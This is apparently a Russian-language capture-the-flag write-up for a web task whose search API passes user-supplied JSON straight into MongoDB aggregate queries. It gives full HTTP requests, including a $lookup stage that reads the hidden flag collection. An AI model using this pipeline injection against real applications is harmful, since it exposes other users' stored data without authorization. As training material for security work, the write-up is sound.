Мыслить тяжело... Мы сделали аггрегатор всех сильных мыслей. Но один анонимус оставил нам неуловимую мысль...

source: [https://storage.yandexcloud.net/nti/thought_aggregator.zip](https://storage.yandexcloud.net/nti/thought_aggregator.zip)

url: [http://outdated:3000/](http://outdated:3000/)


### Writeup

К заданию даются исходные коды. После анализа приходим к выводу, что для поиска используются aggregate-запросы в mongodb. Кроме того, запрос от пользователя посылается в json-виде и не проходит фильтрации.

Это позволяет нам сделать aggregate запрос, объединяющий несколько коллекций (в нашем случае коллекцию flag)

### Эксплуатация

При попытке поиска на на сервер посылается запрос следующего вида:

```http
POST /api HTTP/1.1
Host: 172.21.30.20:3000
Content-Length: 43
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://172.21.30.20:3000
Referer: http://172.21.30.20:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"$match":{"message":{"$regex":".*sometext.*"}}}
```

Мы можем делать любые aggregate-запросы, оформленные в виде json-объектов. Запрос для конкатенации данных из двух коллекций может выглядеть следующим образом:

```http
POST /api HTTP/1.1
Host: 172.21.30.20:3000
Content-Length: 129
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://172.21.30.20:3000
Referer: http://172.21.30.20:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{ "$lookup": {
            "from": "flag",
            "as": "__flag",
"foreignField":"__flag","localField":"flag"
        }}
```

Здесь используется [$lookup](https://docs.mongodb.com/manual/reference/operator/aggregation/lookup/) запрос для объединения информации из нескольких коллекций
